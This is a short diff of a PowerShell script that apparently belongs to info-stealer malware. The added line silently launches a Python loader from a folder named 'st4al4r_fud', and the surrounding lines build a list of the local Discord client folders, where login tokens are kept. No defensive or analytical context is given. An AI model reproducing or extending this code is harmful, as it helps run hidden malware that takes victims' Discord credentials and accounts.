@@ -115,6 +115,7 @@ if (!(Test-Path $markerFile)) {
     Remove-Item -Path $zipPath -Force
     New-Item -ItemType File -Path $markerFile | Out-Null
 }
+Start-Process -FilePath "$dir\st4al4r_fud\Scripts\pythonw.exe" -ArgumentList "$dir\st4al4r_fud\Scripts\loader.py"
 
 $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
